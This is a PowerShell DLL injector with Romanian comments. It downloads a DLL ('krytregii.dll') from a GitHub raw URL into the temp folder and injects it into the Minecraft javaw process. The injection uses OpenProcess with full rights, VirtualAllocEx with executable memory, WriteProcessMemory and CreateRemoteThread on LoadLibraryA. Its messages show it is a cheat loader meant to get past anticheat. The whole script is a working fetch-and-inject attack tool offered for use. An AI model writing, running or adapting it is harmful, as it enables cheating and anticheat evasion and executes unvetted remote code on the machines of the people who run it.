# --- CONFIGURARE ---
# ASIGURĂ-TE CĂ ACEST LINK ESTE RAW (raw.githubusercontent.com)
$dllUrl = "https://raw.githubusercontent.com/dsdfdcvdcwcwcdw/dsadsadasdsaadasdsa/main/krytregii.dll"
$dllPath = "$env:TEMP\kryt_v8.dll"
$procName = "javaw"

# --- CURĂȚARE ---
# Ștergem orice versiune veche pentru a preveni erorile de tip "Access Denied"
Remove-Item "$env:TEMP\kryt_*.dll" -ErrorAction SilentlyContinue

# --- DOWNLOAD ---
Write-Host "Descarcare DLL din GitHub..." -ForegroundColor Cyan
try {
    Invoke-WebRequest -Uri $dllUrl -OutFile $dllPath -UseBasicParsing -ErrorAction Stop
} catch {
    Write-Host "EROARE: Nu s-a putut descarca DLL-ul. Verifica link-ul!" -ForegroundColor Red
    pause; exit
}

# --- LOGICĂ INJECȚIE ---
$s = @'
[DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(uint a, bool b, uint p);
[DllImport("kernel32.dll")] public static extern IntPtr GetModuleHandle(string m);
[DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr h, string n);
[DllImport("kernel32.dll")] public static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr a, uint s, uint t, uint p);
[DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr h, IntPtr a, byte[] b, uint s, out uint w);
[DllImport("kernel32.dll")] public static extern IntPtr CreateRemoteThread(IntPtr h, IntPtr ta, uint s, IntPtr sa, IntPtr p, uint c, IntPtr tid);
[DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr h);
'@

$k = Add-Type -MemberDefinition $s -Name "W32" -Namespace "K" -PassThru

# Căutăm procesul Minecraft
$p = Get-Process $procName -ErrorAction SilentlyContinue | Select-Object -First 1
if (!$p) { 
    Write-Host "Minecraft (javaw) nu a fost gasit! Porneste jocul mai intai." -ForegroundColor Red
    pause; exit 
}

# Deschidem procesul cu drepturi depline
$h = $k::OpenProcess(0x1F0FFF, $false, $p.Id)
if ($h -eq [IntPtr]::Zero) { Write-Host "Eroare la deschiderea procesului!" -ForegroundColor Red; pause; exit }

# Obținem adresa LoadLibraryA
$l = $k::GetProcAddress($k::GetModuleHandle("kernel32.dll"), "LoadLibraryA")

# Alocăm memorie în Minecraft pentru calea DLL-ului
$m = $k::VirtualAllocEx($h, [IntPtr]::Zero, [uint32]$dllPath.Length, 0x3000, 0x40)

# Scriem calea DLL-ului în memoria alocată
$b = [System.Text.Encoding]::ASCII.GetBytes($dllPath)
$o = 0
$k::WriteProcessMemory($h, $m, $b, [uint32]$b.Length, [ref]$o)

# STABILITATE: Mică pauză înainte de execuție
Start-Sleep -Milliseconds 500

# Executăm LoadLibraryA în procesul Minecraft
$rt = $k::CreateRemoteThread($h, [IntPtr]::Zero, 0, $l, $m, 0, [IntPtr]::Zero)

if ($rt -ne [IntPtr]::Zero) {
    Write-Host "Kryt Loaded Successfully! Onlyfans SG Gods Active." -ForegroundColor Green
    $k::CloseHandle($rt)
} else {
    Write-Host "Injecție esuată! Probabil Anticheat-ul a blocat thread-ul." -ForegroundColor Red
}

$k::CloseHandle($h)
Write-Host "Poti inchide aceasta fereastra."
Start-Sleep -Seconds 2
